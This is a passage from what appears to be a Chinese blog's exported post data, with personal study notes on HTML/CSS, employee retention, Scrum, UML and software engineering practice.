em和%是相对字体的大小，所以使用em和%指定字体大小时，就意味着字体大小要相对于其父元素的字体大小指定； 使用相对字体大小可以让页面更方便维护； 在body规则中使用字体大小关键字来设置基本字体大小，这样如果用户希望让文本更大或者更小，所有浏览器就能按比例缩放字体大小； 可以使用font-weight将字体设置为粗体； font-style用来创建斜体或倾斜文本； Web颜色是混合不同数量的红、绿、蓝得到的；如果三者都是100%则得到白色，如果都是0%则得到黑色； CSS有16个基本色，以及150种扩展颜色； 可以使用百分数、数值或十六进制码来得到想要的颜色；举例：rgb(100%, 50%, 0%), 或者rgb(255, 125, 0), 或者#00BCF5; 表示颜色的十六进制码有6位，前两位表示红色数量，中间两位表示绿色数量，后两位表示蓝色数量； 可以使用text-decoration为文本创建一个下划线；或者取消链接文本的下划线； 第九章 盒模型 CSS使用盒模型来控制一个元素如何显示； 盒子由内容区、内边距、边框和外边距组成； 内边距用来在内容区周围创建可见的空间；边框包围内边距和内容，它提供了从视觉上分享内容的一种手段；外边距包含边框、内边距和内容，允许在元素和其他元素之间创建空间；三者都是可选的； 元素的背景会在内容和内边距下面显示，但不会延伸到外边距下面； 内边距和外边距大小可以用像素或者百分数设置； 边框宽度可以用像素表示，也可以用Thin&#x2F;Medium&#x2F;Thick来指定； 有8种不同的边框样式，包括实线、破折线、虚线和脊线； 对于外边距、内边距和边框，CSS提供了相应的属性，可以一次对所有四个边（上下左右）完成设置，也可以单独设置任意一边； 使用border-radius属性可以对有边框的元素创建圆角； 使用line-height可以增加文本行之间的间距； 可以用background-image属性在元素的背景上放置图像； 使用background-position和background-repeat可以设置背景图像的位置和平铺行为； 对于希望成组指定样式的元素要使用class属性； 使用id属性为元素指定一个唯一的名字，还可以使用id属性为元素提供唯一的样式； 一个页面有给定id的元素只能有一个； 可以使用id选择器按id选择元素。例如#myfavorated； 一个元素只能有一个id，但它可以属于多个类； 在HTML中可以使用多个样式表； 如果两个元素表包含冲突的属性定义，HTML文件中最后链接的样式表最为优先； 可以在lind元素中使用媒体查询或者使用CSS中的@media规则来指定设备； 第十章 div和span div用于将相关的元素归组在一起，放在逻辑区中；创建逻辑区有助于标识主内容区和页面的页眉和页脚； 可以使用div元素将需要共同样式的元素归组在一起； 使用嵌套div元素为文件增加更多的结构，这有利于保证结构清晰或者方便增加样式；不过除非确实必要，否则不要过多的增加结构； 一旦用div元素将内容区归组在一起，类似于其他块元素，可以对这些div增加样式。例如，对于包含在div中的一组元素，可以使用嵌入这些元素的div的边框属性，对这组元素增加一个边框； width属性设置一个元素内容区的宽度； 一个元素的总宽度等于内容区宽度，加上所增加的内边距、边框和外边距的宽度； 一旦设置一个元素的宽度，它便不会延伸来占满整个屏幕的宽度； text-align是块元素的一个属性，用来将这个块元素中的所有内容进行对齐，可以居中，左对齐或右对齐；这个属性可以由所有嵌套的块元素继承； 可以使用子孙选择器来选择嵌套在其他元素中的元素，例如子孙选择器div h2{…}会选择嵌套在div元素中的所有h2元素（包括子元素、孙子元素等）； 可以对相关的属性使用快捷方式，例如padding,margin的四个方向的值；还有边框、背景和字体等； span与div类似，不过它用于将相关的内联元素和文本归组在一起；它也可以使用类或者唯一的id，以便对它们增加样式； 有些元素有不同的状态，如a元素有link, visited, hover等状态；可以使用伪类单独的为各个状态指定样式。伪类最常用于a元素, :link对应于未访问的链接， :visited对应于已访问的链接，:hover对应于悬停状态； 伪类也可以使用于其他元素，而不仅限于a，其他伪类包括:active, :focus, :first-child, :last-child, :first-letter, :last-letter 第十一章 布局与定位 浏览器使用流在页面中放置元素； 块元素从上往下流，各元素之间有一个换行。默认每个块元素都会占据整个浏览器的宽度； 内联元素从块元素内部的左上方流向右下方。如果需要多行，浏览器会会换行，在垂直方向上扩展外围块元素，来包含这些内联元素； 正常页面流中两个块元素上下相邻的外边距会折叠为最大外边距的大小，或者如果两个外边距大小相同，会折叠为一个外边距； 浮动元素会从正常流中取出，浮动到左边或右边；浮动元素放在块元素之上，不会影响到正常的页面流。不过，内联内容会考虑浮动元素的边界，围绕着这个浮动元素； clear属性用来指定一个块元素的左边或右边不能有浮动元素（或者左右两边）。设置了clear属性的块元素会下移直到它的两边没有浮动元素； 浮动元素必须有特定的宽度，不能设置为auto； 流体布局是指，扩展浏览器窗口时，页面中的内容会扩展以适应页面； 冻结布局是指，其中内容的宽度是固定的，不会随着浏览器窗口扩展或收缩。好处是可以对布局更多的控制，坏处是不能利用浏览器的宽度了； 凝胶布局是居中的冻结布局，其中好处同； position属性可以设置为4个值：static（静态，默认值），absolute（绝对），fixed（固定），relative（相对）； 绝对定位元素会相对于页面边界来放置； 如果一个绝对定位元素嵌套在另一个定位元素中，这个元素就会相对于外包含元素定位； 使用绝对、固定、相对定位时，属性top&#x2F;right&#x2F;bottom&#x2F;left可以用来指定元素的位置； 绝对定位元素可以使用z-index属性分层设置，元素的z-index的值越大，就越在上层； 固定定位元素总是相对于浏览器窗口定位，页面滚动时，固定定位的元素不会移动。页面中的其他内容会在这些固定定位元素下面正常滚动； 相对定位元素首先正常流入页面，然后按指定的量偏移，从而留出它们原来所有的空间；left&#x2F;right&#x2F;top&#x2F;bottom的值是指相对正常流中该元素位置的偏移量； CSS表格显示允许按一种表格布局来摆放元素；display:table、table-row、table-cell；（有什么优缺点，什么情况下合适使用？） 要创建CSS表格显示时，需要使用到3种块元素，分别为对应表格的一个块元素，对应行的一个块元素，和对应单元格的一个块元素；通常，这3个元素都是div元素； 如果需要建立多栏布局，而且内容栏是均匀的，表格显示就是一个很好的布局策略； 第十二章 HTML5标记 HTML5为HTML增加了很多新元素，包括section,article,aside,nav,header,footer，与使用div相对，它们可以提供更多的含义； section用来对相关的内容分组； article用来类似博客帖子、论坛帖子和新闻报道等独立的内容； aside用来表示不做为页面主内容的次要内容，例如插图或者边栏； nav用来组织页面的导航链接； header将标题、LOGO、署名等通常放在页面或区块最上方的内容组织在一起； footer将诸如文档信息、法律措辞和版权说明等通常放在页面或区块最下方的内容组织在一起； time也是HTML5中的一个新元素，这个元素用来标记日期和时间； div仍然用来组织结构，它通常将元素组织在一起指定样式，或者有些内容可能不适合用HTML5中那些与结构相关的新元素中，这些内容就可以使用div来创建结构； 较早的浏览器不支持HTML5的新元素，所有需要提前确认一下主要用户使用哪些浏览器访问网站，否则不要贸然使用新元素； video是一个新的HTML元素，用于为页面增加视频； 视频编码是用来创建视频文件的编码。常用的编码包括h.264、Vp8和Theora； 视频容器文件包含视频、音频和元数据。流行的容器格式有MP4、OGG和WebM； 要提供多个视频源文件，确保用户可以在他们的浏览器中观看你的视频文件； 第十三章 表格与更多列表 HTML表格用来创建表格数据结构，使用的元素包括table、tr、th、td； table定义并包含整个表格；tr用来定义行；th用来定义标题；td用来定义数据单元格； 可以使用caption提供关于表格的额外信息，一般放在表格上面，可以使用caption-side属性改变位置； 表格有边框间距，也就是单元格之间的间距；表格数据单元格也可以有内边距和边框；可以用CSS进行控制； border-collapse是针对表格的一个特殊CSS属性，允许将单元格的边框合并为一个边框； 可以使用text-align和vertical-align对单元格内的数据进行对齐； 可以用background-color为整个表格、某行或某个单元格增加背景色； 使用nth-child伪类可以为表格隔行增加背景色； 如果一个单元格没有数据，则td&#x2F;td内可以不放置内容，但需要有一个td&#x2F;td保持单元格对齐； 根据你的数据单元格需要跟多少行或者多列，可以使用td元素的rowspan或colspan属性； 可以在表格中嵌套表格，将table元素及所有内容放在一个单元格中； 表格应当用于展示数据，而不是建立页面布局；可以使用CSS表格来创建多栏布局； 可以使用CSS指定列表的样式，有几个特定于列表的CSS属性，包括list-style-type和list-style-image；前者用来指定标记类型，后者用来指定列表的标记图像；（忘了啥意思怎么弄了） 第十四章 HTML表单 form元素定义了表单，所有表单输入元素都嵌套在这个元素中；action属性包含服务器脚本的URL；method属性包含发送表单数据的方法，可以是POST或GET；POST打包表单数据，并将其做为请求的一部分发送到服务器；GET打包表单数据，并将数据追加到URL；如果表单数据是私有的，或者表单数据很多，如使用textareainput元素，或者fileinput元素，就应当使用POST；对于可以加书签的请求，要使用GET； input元素在web页面上可以做为多种输入控件，取决于它的type属性值； type为“text”时，会创建一个单行文本输入框； type为“submit”时，会创建一个提交按钮； type为“radio”时，会创建一个单选按钮。所有同名的单选按钮构成一组互斥的按钮； type为“checkbox”时，会创建一个复选框控件。通过为多个复选框控件指定一组名字，可以创建一组选择；（注意name属性、value属性） type为“number”时，会创建一个只允许数字字符的单行文本输入控件； type为”range”时，会创建一个划动条控件提供数字输入（min和max属性值）； “color”类型会在支持这个类型的浏览器中创建一个颜色选择器（否则为单行文本）； “date”类型会在支持这个类型的浏览器中创建一个日期选择器（否则为单行文本）； “email”、”url”和”tel”类型会创建单行文本输入，在一些移动浏览器上会出现定制键盘来方便数据输入； textarea元素会创建一个多行文本输入区； select元素会创建一个菜单，包括一个或者多个option元素，option元素定义了菜单中的菜单项；通过“multiple”属性可以设置多选； 如果将文本放在textarea元素的内容中，这会成为Web页面上文本区控件中的默认文本； textinput的”value”属性值可以用来为单行文本提供一个初始值； 在提交按钮上面设置value属性可以改变在按钮上面显示的文字； 提交一个Web表单时，表单数据值与相应的数据名配对，所有名和值会发送到服务器； 由于表单有一个表格结构，通常会用CSS表格显示来建立布局。CSS还可以用来指定表单的颜色、字体风格、边框样式； HTML允许用fieldset元素组织表单元素，提醒视觉区分；配套legend元素使用； 可以用label元素以一种有助于提高可访问性的方式关联标签与表单元素；（例如radio，通过点击标签本身即可以选中radio） 使用placeholder属性可以为表单用户提供一个提示，指出你希望在一个输入域中输入什么内容；(例如：输入框里面的提示文字） required属性指示一个输入域是必要的；要让表单成功提交，这个输入域中必须有值。有些浏览器在你提交表单之间会强制要求在这些中输入数据；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"HTML","slug":"HTML","permalink":"http://example.com/tags/HTML/"}]},{"title":"留住好员工-如何让工作更有激情","slug":"留住好员工-如何让工作更有激情","date":"2015-04-26T10:09:00.000Z","updated":"2024-09-22T23:10:59.830Z","comments":true,"path":"2015/04/26/留住好员工-如何让工作更有激情/","permalink":"http://example.com/2015/04/26/%E7%95%99%E4%BD%8F%E5%A5%BD%E5%91%98%E5%B7%A5-%E5%A6%82%E4%BD%95%E8%AE%A9%E5%B7%A5%E4%BD%9C%E6%9B%B4%E6%9C%89%E6%BF%80%E6%83%85/","excerpt":"","text":"什么是充实的工作？ 给员工创造求新，实现新想法的空间； 改善环境，实现个人和团体的目标； 让员工看到自己对产品和目标的贡献； 激励员工拓展自己的知识和能力； 6个问题： 你知道你的工作对公司有多重要吗？ 你在工作中用到了哪些技能，还有哪些是你没有用到的？ 你觉得你的工作有挑战性吗，有价值吗？ 在你现在的任务中，你还希望在哪些领域提升你的职责？ 你希望在未来的3~5年内做什么？ 你希望你的工作有什么变化？ 3个行动步骤： 级别一：有意识的观察。选一员专家让员工进行观察；注意到什么，学习到什么，想法有什么改变； 级别二：有选择的参与。让员工使用一项新技能有选择性或限制性的去实践它； 级别三：重大职责。让员工尝试充分利用新技能或权力独立负责一个项目，在任务的最后提供反馈； 充实工作的方法清单 可与团队成员多多讨论，丰富这个张清单 组成团队：团队内部可以对工作进行重新分配，有更多的变化，团队成员能学到更多的知识； 让员工与客户接触； 任务轮巡：新职责一方面让员工受到重视和挑战，另一方面可以掌握新的技能，有助于原有工作的完成；让员工提议由“谁”和“怎样”完成任务； 通过反馈来构建：寻找同事考评和客户考评的机会，通过持续反馈让员工知道自己的表现从而不断改进； 普遍的参与：让员工参与到对其工作有影响的决策中去； 发挥创造力：给员工自由和资源让他们进行创造，用新的任务、作业和学习为他们提供挑战； 教学激励：教给其他人知识能够激励更多人，如果一个员工享受传授知识这个过程的话； 回报潜力测验： 能否帮你提升自己的技能？ 能否提高你在公司或行业中的受欢迎程度？ 能否提高你作为一名专家或者通才的声誉？ 能否帮你在现在的岗位上赢得更多的自信和竞争力？ 能否扩大你的工作网络？ 能否为你的日常生活增添乐趣？ 这里面什么是你对你的团队有利的？ 能否帮你和你的团队提高工作效率？ 能否增加你对团队或部门的贡献？ 能否让别人的生活更好、更方便、更有意思？ 能否对现在的公司任务、战略或者目标做出贡献？ 能否实现现在相关的业务需求？ 让员工挑选几个充实工作的办法，做为接下来一段时间的目标，并制定具体的行动方案；并完成以上的回报潜力测验；","categories":[{"name":"社科","slug":"社科","permalink":"http://example.com/categories/%E7%A4%BE%E7%A7%91/"}],"tags":[{"name":"管理","slug":"管理","permalink":"http://example.com/tags/%E7%AE%A1%E7%90%86/"}]},{"title":"留住好员工-5大问题清单","slug":"留住好员工-5大问题清单","date":"2015-04-25T01:56:00.000Z","updated":"2024-09-22T23:10:54.986Z","comments":true,"path":"2015/04/25/留住好员工-5大问题清单/","permalink":"http://example.com/2015/04/25/%E7%95%99%E4%BD%8F%E5%A5%BD%E5%91%98%E5%B7%A5-5%E5%A4%A7%E9%97%AE%E9%A2%98%E6%B8%85%E5%8D%95/","excerpt":"","text":"一、了解他们的才华 在团队里面，你觉得你有哪些地方与众不同； 讲一个你特别引以为豪的成就； 你最重要与工作相关的价值在哪里； 你哪些价值（或能力）在工作当中得到了体现，哪些没有； 如果由你选择和不同的人、数据、事物和想法打交道，怎样的搭配你觉得最开心，为什么； 注意事项：具体问题具体分析，不要想当然，看是什么让他们与众不同；给予鼓励与支持，不要审问你的员工（展开调查）； 二、提供你对他们的看法 你得到的对你最有帮助的反馈是什么； 你如何改变你的行为； 为了自己的工作，你如何去适应这些变化； 我可以在哪些你期待的领域内给你更多的反馈； 我怎样才能帮助你在工作上获得更大的成功； 你的同事认为你的哪项团队技巧更有价值；你是如何知道的；在他们对你的反馈基础上，你希望自己的哪些技能得到改善； 注意事项：让员工进行自我评价，询问他人的意见；不要为了逃避现实而说谎；给予明确、具体、有建设性的反馈，同时提供一些案例；不仅要关注业绩反馈，同时也要利用发展反馈; 对标准和期望进行归类；不要只强调短处，要保持均衡，也要强调一下他们的强项； 三、讨论趋势 将对公司产生重大影响的一些正在进行的经济、政治和社会上的变化有哪些； 未来面临的机遇和问题是什么； 在你的行业中哪些领域的变化最快； 他们的职业在未来的2~5年内会有什么变化； 在公司中，对成功来说真正重要的是什么； 有哪些商业出版物、期刊、企业报纸提供了行业和商业趋势的信息； 注：不一定全部由自己解决，向员工开放更多渠道，让他们可以更进一步了解公司的商业需求。 注意事项：提供公司、行业和职业趋势的信息；不要小看不断的变化对员工发展的影响；让每个优秀的人才都接触到你的圈子；不要回避不可预见的未来；就如今的挑战对他们职业的影响，和他们说说你的见解；不要回避企业文化对职业的重要性； 四、发现多种可能性 你是否就企业现在的活动和计划掌握了足够的信息； 你怎样得到你所需要的信息； 在选择自己职业发展可能性的时候，你是否考虑到了所有可能的方向； 你的这些选项是否充分涵盖了各种情况； 你是不是有更多的职业发展选择； 你的目标是否与公司的目标和计划一致； 注意事项：讨论多种现实的职业目标；不要让员工只追求职位的升迁；鼓励员工对自己的未来做出预见；不要轻易承诺；帮助员工设定和企业需求一致的目标；设想一下几种可能的结果； 五、共同设计行动计划 帮助员工认识到每条道路将会遇到的困难，然后针对这些困难进行头脑风暴。在这些过程中，帮助他们记住自己现在已经拥有的资源并将其最大化。 你需要什么样的技能来帮助你实现你的目标； 有哪些你已经拥有的才能可以帮助你实现你的目标； 已经处在你圈子里的人哪些可以为你创造机会； 我提供什么样的培训能够帮你填补你已经实现的差距； 什么样的在职培训能够帮助你更好的地实现自己的几个选择； 注意事项：就资源和在职培训提供计划；不要只依赖培训来发展自己；让每个人都采取行动；不要回避推荐你部门之外的资源；直言不讳，帮助他们巩固自己的计划；不要将现行的任务视为一般的练兵；","categories":[{"name":"社科","slug":"社科","permalink":"http://example.com/categories/%E7%A4%BE%E7%A7%91/"}],"tags":[{"name":"管理","slug":"管理","permalink":"http://example.com/tags/%E7%AE%A1%E7%90%86/"}]},{"title":"硝烟中的 SCRUM 和 XP","slug":"硝烟中的 SCRUM 和 XP","date":"2015-03-30T12:51:00.000Z","updated":"2024-09-22T23:08:43.583Z","comments":true,"path":"2015/03/30/硝烟中的 SCRUM 和 XP/","permalink":"http://example.com/2015/03/30/%E7%A1%9D%E7%83%9F%E4%B8%AD%E7%9A%84%20SCRUM%20%E5%92%8C%20XP/","excerpt":"","text":"一、如何写产品的BACKLOG ID、NAME、重要性分数、如何演示、初始点数、备注；可选字段：类别（用于快速筛选）、需求提出者（用于开发过程中反馈）、Bug ID（用于与BUG关联）； 始终让BACKLOG只关注于业务层面，而非面向技术的解决方案（技术方案最多做为一项可选的备注）；方法：针对BACKLOG，不断的问产品负责人：这是为什么呢？ 二、如何准备Sprint会议 在开会前，必须有产品的BACKLOG；并且给BACKLOG的每个条目打好重要性分数； 只有一个产品BAKCLOG，以及只有一个产品负责人（以免冲突）； 其他人也可以添加BACKLOG故事，但重要性分数由产品负责人填写（特殊权利）； 产品负责人必须明白每一条BACKLOG的含义；（如果他人添加的故事，产品负责人必须弄明白它为什么在这里； 三、怎么制定Sprint计划 要得到的成果：Sprint目标、Sprint的Backlog、参与人名单及投入程度、每日站会的时间与地点、确定好Sprint演示日期； 注意事项：产品负责人必须参加、宁可减少范围不可牺牲质量（不然后续要一直为错误买单）； Sprint的任何事情都要有一个时间盒，所以，Sprint会议也一样；（先尝试4个小时，半天时间）； 会议进程：1）30分钟，产品负责人概括Sprint目标，介绍Backlog，确定演示的时间和地点；2) 90分钟，团队成员估算每条Backlog的时间（点数），必要的情况下，拆分Backlog，产品负责人调整重要性分数；所有重要性高的故事，都需要填写“如何演示”；3）60分钟，团队选择要放入Sprint的故事，计算生产率，用于核算工作安排的基础；4）把故事进一步拆分成任务；5）安排固定的每日例会的时间和地点； Sprint的长度，据说3周让大家比较舒服。但是不管如何，多试验几次找到一个合适的节奏；（短有短的好处，迭代更快，但也有短的压力，比如开会和演示更频繁） 定义“完成”：测试人员说了算，将责任转到测试人员的身上（当然，测试人员要有自己的专业测试清单）；其他几种做法：随时可以上线；已经部署到测试服务器，随时等待测试组进行验收测试；（如果各成员有困惑，则在故事中多增加一个字段叫：何谓完成？ 用扑克牌做时间估算：0、0.5、1、2、3、5、8、13、20、40、100；（单个故事尽量控制在2-8个点）； 明确故事内容：注意填写“如何演示”那个字段；好处：可以避免大家对故事的理解有偏差； 故事拆分成任务：如果时间来不及，或者故事很简单，可以不做；但通常如果时间够的话，建议要做，因为这样大家的估算会更加准确，而且也会发现一些潜在的工作； 关于BUG：处理方式有好几种，先尝试简单的一种：即将BUG打印出来，带到sprint会议上，与其他故事一起贴到墙上去； 关于技术故事的几种做法：1）将技术故事变成可以衡量价值的业务故事，方便产品负责人判断优先级；2）将其放入某个故事中作为一个任务；3）如果都不行，单独列出来，找产品负责人好好谈一谈利弊； 四、如何让别人了解我们的Sprint Sprint计划会议结束后，ScrumMaster建一个wiki页面，内容包括：sprint目标，Backlog故事，点数，时间（开始、Demo、每日例会），成员； 给大家发个垃圾邮件，贴上这个页面的链接； 打印这个页面，贴在团队办公室的门口； Sprint的演示来临前，再发个垃圾邮件，欢迎大家来看演示； 五、如何编写Sprint Backlog 找一面墙，2*2平方米，贴上白纸； 分成4列，分别为待完成、进行中、已完成，还有一列燃尽图，加上计划外工作，加上下阶段的Backlog; 故事+Task；故事按顺序来做，不要搞反顺序； 六、如何布置团队房间让团队做在一起，定义：互相听到、互相看到、与其他团队隔离（屏蔽大多数噪音即可）；让产品负责人无路可走（不要坐在一起，以免陷入细节，但要随时看到和找到讨论问题）；让团队经验和教练无路可走；（一开始尽量贴近指导，之后逐渐远离，让团队形成自组织性）； 七、怎样进行每日例会 固定时间、固定地点，汇报昨天做了什么，今天要做什么，碰到什么困难；更新Backlog的时间估算，或者移动它； 让大家参与更新任务板；会议结束时，有人负责算出剩余工作的时间估算之和； 处理老是迟到的人：弄个存钱罐吧，迟到的人投点钱，以后做活动经费； 处理不知道该干嘛的人：给他分配任务、安排他打杂；如果有人老是这样，如果他不重要，那将他挪出团队，如果他很重要，让他跟别人结对，让另外一个人充当他的“牧羊人”，指导他要做什么；（以上都是无可奈何的办法，但多少有点效果） 八、如何做演示演示有很多好处，其中一条是让大家真正完成一些工作，而不是基本完成；好的演示给人的工作成果带来肯定，坏的演示促使大家真正关注任务本身；演示只关注于业务层面，即我们做了什么，而不是技术层面的如何做；不要演示BUG修复和一些不重要的细节，保持快节奏，不需要弄得好看；可能的话，让观众试一下产品； 九、如何做Sprint回顾 回顾的目的，不是为了让自己想到好点子，而是让这个点子出自团队的讨论和思考，让成员接受它更加容易； 时间安排1-3个小时；找一个不受打扰的地方；指定一个人做秘书，写会议记录；ScrumMaster根据Backlog对Sprint做总结，包括重要决策和事项,引导大家回顾发生过的事情及完成的工作；团队每个人不被打断轮流发言，主题是哪些做法好，哪些做法可以改进，哪些需要改变；对比预估与实际生产率的差异，分析原因；Scrum总结大家的具体建议，得出下一个Sprint需要改进的地方； 可以弄个白板，借鉴头脑风暴的做法，将大家的建议写下来贴到白板上面；针对ScrumMaster总结的改进建议，每个人进行投票，每人3票，随便投，全部投给一个建议也可以； 一个好问题：如何时间可以倒流，那你觉得哪些事情你会换一种方式来做？ 有些建议不一定真的要去做任何改变，因为它有可能在下一个sprint中就自动消失了； 十、如何在Sprint之间做休整在回顾和计划之间，至少要有一个不需要考虑Sprint的夜晚，最好能够间隔一个周末；如果可以的话，弄一个实验日，在这一天，大家不用工作，而是在办公室里，自由安排自己的时间，学习自己想学习的东西；（源自google的做法）如果可能的话，让它处在2个sprint之间；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"项目管理","slug":"项目管理","permalink":"http://example.com/tags/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/"}]},{"title":"UML","slug":"UML","date":"2015-02-12T00:55:00.000Z","updated":"2024-09-22T04:06:36.086Z","comments":true,"path":"2015/02/12/UML/","permalink":"http://example.com/2015/02/12/UML/","excerpt":"","text":"序列图什么是序列图？序列图将组织内的人和非人系统当作一个个对象，通过对象之间协作，达到业务用例的实现。序列图即是描述这些对象协作的流程图。 为什么要画序列图？理清现状、找出值得改进的点 改进的点1，用信息流替代物流；（用供应链的话语说，即是用信息换库存）2，优化信息流流转；（将低效的流转方式改成高效的流转方式）3，用信息流封装原先存储于人脑中的处理逻辑（用机器实现自动化，但有没有会失去灵活性的可能？让情况不在机器设定的逻辑范围之内的时候，再考虑引入人工处理，这样人工就可以集中精力于异常情况） 阿布思考法：假设拥有无限的资源，得到一个完美的方案；用手头现有的资源去山寨这个完美方案。 随记业务建模：从组织的角度来定位系统应该提供的价值。怎么选定组织：愿景波及的，需要改进的组织。越具体越好，范围太大或者太小都不利于清晰的分析。业务执行者、业务工人、业务实体（什么是业务执行者、业务工人、业务实体？）业务用例：业务执行者希望通过与组织交互达到的，组织能够提供的价值。识别业务用例的2条路线：1，（主要）业务执行者对组织的期望和组织的承诺；2，（补漏）通过观察组织的内部活动，一直追问为什么这么做，最终推导到组织外部的执行者。（感觉如果做企业间协同的话，是否组织的范围就变得很大了？）业务流程是业务用例的实现。 在序列图中，焦点是对象之间的责任分配，而不是数据流。谁找谁，谁有责任完成什么事情。 愿景什么是愿景？在老大看来，引进这个系统的目的是什么？ 谁是老大？一个系统会有很多涉众，老大是其中最有发言权的那个，即权衡各种需求时，他的意见是最重要的。ccw注：如果老大是组织的负责人，他一般会从管理者的角度来看待问题。这样有利有弊，利是管理者的目标容易被重视和满足，弊是执行者的利益有时会被忽略，要特别注意权衡并尽量同时满足两边的目标，才能最大程度的提高系统的易用性。 具体的组织人群是谁？使用人群定位越清晰越好。泛泛的定位，容易让产品在众多需求中迷失，导致产品无法在关键点上做到极致。 可度量的目标列出系统的目标，这些目标是否实现需要是可以度量的，这样就要求目标必须非常具体和清晰，不能泛泛。 用例图什么是用例图？答：业务用例–业务执行者希望通过与组织交互达到的，组织能够提供的价值。 为什么要使用用例图？理清楚外部执行者对组织的期望和组织能够提供的价值。区分开来组织的用例和系统的用例之间的区别。更好的思考系统如何更好的满足组织本身要提供的价值。（系统的用例和组织的用例区别在哪里？） 画用例图要注意哪些事项？识别业务用例的2条路线：1，（主要）业务执行者对组织的期望和组织的承诺；2，（补漏）通过观察组织的内部活动，一直追问为什么这么做，最终推导到组织外部的执行者。 流程图：描述产品功能的处理过程（功能的执行顺序、分支和循环的逻辑）","categories":[{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"UML","slug":"UML","permalink":"http://example.com/tags/UML/"}]},{"title":"构建之法","slug":"构建之法","date":"2015-01-11T01:29:00.000Z","updated":"2024-09-22T23:08:41.995Z","comments":true,"path":"2015/01/11/构建之法/","permalink":"http://example.com/2015/01/11/%E6%9E%84%E5%BB%BA%E4%B9%8B%E6%B3%95/","excerpt":"","text":"需求分析过程获取和引导需求分析和定义需求：有多少用户需要，能承受什么价位、实现所需时间与成本、各个需求的优先级验证需求软件生命周期中的需求管理：开发过程中需求会产生变化 分类对产品功能性的需求对产品开发过程的需求非功能性的需求：服务质量需求，例如访问速度、并发量等 利益相关者用户顾客：购买人市场部监管机构软件工程师 获取用户需求焦点小组：集中目标用户的代表，加上利益相关者，讨论用户想要什么深入面谈：可用性、易用性（以上二者会产生需求分析的结果：用户场景）卡片分类：对杂乱无章的需求进行整理用户问卷调查：感觉适用场景更多面向简单的问题，不需要深入交谈，用户可简单做出判断给出答案的问题民族志&#x2F;人类学调查眼动跟踪研究快速原型A&#x2F;B测试 竞争性需求分析的框架NABCDN需求：你的创意解决了用户的什么需求？要充分了解用户的痛苦，对已有软件、服务不满意的地方。A做法：产品的解决方案B好处：产品能给用户带来什么好处，是否有迁移成本？C竞争：分析竞争对手的产品，看清楚我方的优势在哪里，我方的劣势在哪里D推广：如果将产品推广到用户的手中？ 功能的定位四象限法杀手功能&#x2F;外围功能必要需求&#x2F;辅助需求 必要+杀手：第一象限，差异化，产生同类产品比不了的功能和优势，我有人无，或者一个数量级上的优势，全力以赴投资在这个领域。必要+外围：第二象限，抵消，快速达到和别人差不多，对于大家都特别看重的功能，采取”优化“的办法，达到行业最佳辅助+外围：第三象限，维持，以最低代价维持此功能辅助+杀手：第四象限，建议采取维持的办法，或者现在不做，等待好的时机，或者让小部分人做实验 计划和估计分清楚几个概念：目标（未必能够实现）、估计（人力物力时间）、决心（保证）在每一轮估计中，注意探询数值背后的假设，探险者总是高估自己的能力办法一：参考前人的经验办法二：快速原型法-用一两个先锋去探路Y时间&#x3D;X（估计的时间）+-X&#x2F;N（类似工作的次数） 分而治之WBS （work breakdown structure）父节点、子节点、叶子节点 保证子节点能够覆盖父节点的所有内容 保证各个子节点不要相互覆盖 叶子节点要足够小，能够在一个里程碑中完成，成本最好不要超过两周 从结果出发构建WBC，而不是从团队的活动出发Those entrepreneurs who start out with the idea that they’ll make it big - and in a hurry - can be guaranteed failure. 项目经理一个团队可以有几类PM 做功能设计的 对商业和客户有很强的了解能力的 有广泛的经验和知识面，以及商业拓展能力的 驱动流程的，推动团队完成一个版本的开发，准时上线的 专门深入某一领域的，例如软件的国际化&#x2F;本地化等 和研究人员合作，琢磨前沿技术如何能进入主流产品，进行技术转化的等等 特点： 不是行政领导，和大家平等工作，推动团队完成软件的功能 一个团队可以有很多PM 和其他团队成员一起形成决议 管事不管人 一定做具体工作 具体任务 带领团队形成团队的目标、远景，把抽象的目标转化成可执行的、具体的、优美的设计 管理软件的具体功能的生命周期（需求&#x2F;设想&#x2F;设计&#x2F;实现&#x2F;测试&#x2F;修改&#x2F;发布&#x2F;升级&#x2F;迁移&#x2F;淘汰） 创建并维护软件的规格说明书，让它成为开发&#x2F;测试人员及时准确的指导而不是障碍 代表客户和用户的利益，主动收集用户反馈、预期用户新的需求。协调并决定各种需求的优先级 分析并带领其他成员形成对缺陷&#x2F;变更的一致意见、并确保实施 带领其他成员确保项目保持功能&#x2F;时间&#x2F;资源的合理平衡，跟踪项目进展，确保团队发布让客户满意的软件 收集团队项目管理和软件工程的各种数据，客观分析项目实施过程中的做缺点，推动项目成员持续改进，从而提振士气 软件设计与实现典型的开发流程 功能需求 SPEC复审&amp;设计 详细设计 代码实现 DEV自测 同伴复审 源代码同步、合并、构建 签入测试 提交签入关联Work Item 构建成功 BVT成功 自动测试 功能全面测试 功能完成 如果在测试过程中发现BUG，则需BUG分析和修复 开发阶段的一些管理办法 每日构建：可以提高团队成员的积极性 小强地狱：当某人的BUG超过设定的阈值时，停止开发新功能，进入修改BUG状态，直到BUG数量降低到阈值以下。 构建大师：由导致构建失败的人担任，负责管理构建服务器；调试构建，负责找错，并分析出错原因；负责把构建大师称号转给下一任构建失败的成员。 用户体验用户体验的要素 用户的第一印象：用户第一次登录产品，我们想传达给用户一个什么印象？简单，大胆的减法。 从用户的角度思考问题：同理心。 软件服务始终要记住用户的选择：选择过一次设定后，其他场景或下次都默认这个设定，直至其修改。 一次使用与多次使用：一个功能一次性使用感觉好用，但如果多次使用呢？会不会厌烦？或者没有新东西？ 不让用户犯简单的错误：设计成让用户很难犯错的模式 用户体验和质量：是否可以牺牲一些质量，换取让用户体验更好一些？ 5W1Hwho，谁是我们的目标用户？when，用户在什么时间段使用我们的产品？where，用户在什么地方或环境下使用我们的产品？what，我们的产品是什么？用户想达到什么目的？他们的期待是什么？why，用户为什么使用我们的产品？和其他竞争产品相比，为什么他们要选择我们？他们的动机是什么？How，用户是如何与产品发生交互的，他们是怎么用的？在使用过程中有什么问题吗？ 用户体验设计的目标和步骤目标：降低用户的认知阻力，即用户对软件界面的认知（想象某事应该怎么做，想象某操作应该产生什么结果）和实际结果之间的差异。 步骤： 